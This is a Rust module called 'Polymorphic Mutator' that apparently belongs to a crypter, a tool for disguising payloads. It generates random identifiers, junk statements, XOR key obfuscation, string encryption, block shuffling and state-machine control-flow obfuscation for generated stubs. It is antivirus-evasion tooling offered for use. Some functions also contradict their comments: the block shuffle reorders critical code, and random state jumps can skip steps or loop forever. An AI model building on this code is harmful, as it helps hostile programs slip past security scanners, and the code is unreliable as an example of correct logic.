// Polymorphic Mutator
// Generates random variable names, junk code, etc.

use rand::seq::SliceRandom;
use rand::Rng;

/// Generate random variable name
pub fn random_var_name() -> String {
    let prefixes = [
        "var", "tmp", "val", "data", "obj", "ptr", "ref", "buf", "mem", "arr", "src", "dst", "key",
        "iv", "res", "out", "inp", "len", "idx", "cnt",
    ];
    let suffixes = [
        "1", "2", "x", "y", "a", "b", "c", "d", "i", "j", "k", "l", "m", "n", "p", "q", "r", "s",
        "t", "u",
    ];

    let mut rng = rand::thread_rng();
    let prefix = prefixes.choose(&mut rng).unwrap();
    let suffix = suffixes.choose(&mut rng).unwrap();
    let num = rng.gen_range(0..10000);

    format!("{}_{}_{}", prefix, suffix, num)
}

/// Generate random function name
pub fn random_function_name(base: &str) -> String {
    let mut rng = rand::thread_rng();
    let suffix = rng.gen_range(1000..9999);
    format!("{}_{}", base, suffix)
}

/// Generate junk code (no-op operations)
pub fn generate_junk_code() -> String {
    let junk_templates = vec![
        "let _ = std::time::SystemTime::now();",
        "let _ = std::env::current_dir();",
        "let _ = std::thread::current().id();",
        "std::hint::black_box(0u32);",
        "let _ = std::mem::size_of::<usize>();",
        "let _ = std::ptr::null::<u8>();",
        "let _ = std::process::id();",
        "let _ = std::mem::align_of::<usize>();",
        "let _ = std::hint::black_box(0u64);",
        "let _ = std::mem::size_of_val(&0u32);",
        "let _ = std::ptr::null_mut::<u8>();",
        "let _ = std::thread::available_parallelism();",
    ];

    let mut rng = rand::thread_rng();
    let count = rng.gen_range(2..6); // 2-5 junk statements

    (0..count)
        .map(|_| junk_templates.choose(&mut rng).unwrap().to_string())
        .collect::<Vec<_>>()
        .join("\n    ")
}

/// Obfuscate key by XORing with a random constant
pub fn obfuscate_key(key: &[u8]) -> (Vec<u8>, u8) {
    let mut rng = rand::thread_rng();
    let xor_const = rng.gen::<u8>();
    let obfuscated: Vec<u8> = key.iter().map(|b| b ^ xor_const).collect();
    (obfuscated, xor_const)
}

/// Obfuscate string literal
/// Note: Now uses string_obfuscator module
#[allow(dead_code)]
pub fn obfuscate_string(s: &str) -> (Vec<u8>, Vec<u8>) {
    crate::crypter::string_obfuscator::encrypt_string(s)
}

/// Calculate SHA256 hash of file
/// Note: Used for testing/validation in Phase 9
#[allow(dead_code)]
pub fn calculate_hash(file_path: &str) -> Result<String, String> {
    use sha2::{Digest, Sha256};
    use std::fs;

    let contents = fs::read(file_path).map_err(|e| format!("Failed to read file: {}", e))?;
    let mut hasher = Sha256::new();
    hasher.update(&contents);
    let result = hasher.finalize();
    Ok(hex::encode(result))
}

/// Reorder code blocks (for polymorphism)
/// Note: Currently implemented inline in stub_gen.rs, kept for future use
#[allow(dead_code)]
pub fn reorder_code_blocks(blocks: Vec<String>) -> Vec<String> {
    let mut rng = rand::thread_rng();
    let mut reordered = blocks;
    // Shuffle blocks where safe (maintains execution order for critical parts)
    // Only shuffle non-critical blocks
    reordered.shuffle(&mut rng);
    reordered
}

/// Generate control flow obfuscation (state machine)
/// Note: Currently implemented inline in stub_gen.rs, kept for future enhancement
#[allow(dead_code)]
pub fn generate_state_machine(states: Vec<&str>) -> String {
    let mut rng = rand::thread_rng();
    let mut code = String::new();

    let state_var = random_var_name();
    let current_state = rng.gen_range(0..states.len());

    code.push_str(&format!("    let mut {} = {};\n", state_var, current_state));
    code.push_str("    loop {\n");
    code.push_str(&format!("        match {} {{\n", state_var));

    for (i, state) in states.iter().enumerate() {
        code.push_str(&format!("            {} => {{\n", i));
        code.push_str(&format!("                {};\n", state));
        // Random next state or break
        if i == states.len() - 1 {
            code.push_str("                break;\n");
        } else {
            let next_state = if rng.gen_bool(0.7) {
                i + 1
            } else {
                rng.gen_range(0..states.len())
            };
            code.push_str(&format!(
                "                {} = {};\n",
                state_var, next_state
            ));
        }
        code.push_str("            }\n");
    }

    code.push_str("            _ => break,\n");
    code.push_str("        }\n");
    code.push_str("    }\n");

    code
}
